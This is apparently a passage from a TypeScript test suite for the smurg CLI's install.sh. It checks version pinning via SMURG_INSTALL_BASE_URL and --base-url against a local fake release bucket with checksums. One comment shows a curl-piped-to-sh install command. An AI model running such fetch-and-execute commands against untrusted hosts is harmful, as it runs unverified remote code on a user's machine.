    cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
    return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, requests };
  }

  async function bucket(dirs: Dirs): Promise<string> {
    const root = join(dirs.home, 'bucket');
    for (const version of ['9.8.6', '9.8.7']) {
      const files = fullRelease();
      for (const target of TARGETS) files[target.name] = fakeBinary(target.name).replace('smurg 9.8.7', `smurg ${version}`);
      files['SHA256SUMS'] = TARGETS.map((target) => `${sha(files[target.name] as string)}  ${target.name}\n`).join('');
      files['THIRD-PARTY-NOTICES.txt'] = `notices of ${version}\n`;
      files['install.sh'] = (await readFile(INSTALL, 'utf8')).replace("SMURG_RELEASE_BASE_URL=''", `SMURG_RELEASE_BASE_URL='https://downloads.smurg.ai/v${version}'`);
      for (const [name, text] of Object.entries(files)) {
        await mkdir(join(root, `v${version}`), { recursive: true });
        await writeFile(join(root, `v${version}`, name), text);
      }
    }
    await mkdir(join(root, 'latest'), { recursive: true });
    await writeFile(join(root, 'latest', 'install.sh'), await readFile(join(root, 'v9.8.7', 'install.sh')));
    await writeFile(join(root, 'latest', 'VERSION'), '9.8.7\n');
    return root;
  }

  it('the download location can still be overridden (SMURG_INSTALL_BASE_URL, --base-url): it picks a version prefix; latest/ itself is not one', async () => {
    const dirs = await setup();
    const server = await serveBucket(await bucket(dirs));
    const f = await faked(LINUX_X64);
    const latest = await readFile(join(dirs.home, 'bucket', 'latest', 'install.sh'), 'utf8');

    // `curl -fsSL <server>/latest/install.sh | SMURG_INSTALL_BASE_URL=<server>/v9.8.6 sh`: the older version.
    const pinned = await runShell('/bin/sh', ['-s'], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
    expect(pinned.out).toContain('smurg 9.8.6 (fake smurg-linux-x64)');
    expect(pinned.code).toBe(0);
    expect(pinned.out).toContain(`Licenses of the third-party components: ${server.base}/v9.8.6/THIRD-PARTY-NOTICES.txt`);
    expect(server.requests.sort()).toEqual(['/v9.8.6/SHA256SUMS', '/v9.8.6/smurg-linux-x64']);

    // --base-url wins over the environment.
    server.requests.length = 0;
    const flag = await runShell('/bin/sh', ['-s', '--', '--base-url', `${server.base}/v9.8.7/`], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
    expect(flag.out).toContain('smurg 9.8.7 (fake smurg-linux-x64)');
    expect(flag.code).toBe(0);
    expect(server.requests.sort()).toEqual(['/v9.8.7/SHA256SUMS', '/v9.8.7/smurg-linux-x64']);
    expect(await readFile(join(f.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));

    // latest/ holds only install.sh and VERSION: as a download location it fails cleanly and installs nothing.
    const g = await faked(LINUX_X64);
    server.requests.length = 0;
    const wrong = await runShell('/bin/sh', ['-s'], { ...g.env, SMURG_INSTALL_BASE_URL: `${server.base}/latest` }, latest);
    expect(wrong.code).not.toBe(0);
    expect(wrong.out).toContain(`cannot download ${server.base}/latest/SHA256SUMS`);
    expect(server.requests).toEqual(['/latest/SHA256SUMS']);
    expect(existsSync(join(g.dirs.home, '.local', 'bin'))).toBe(false);
  });
});
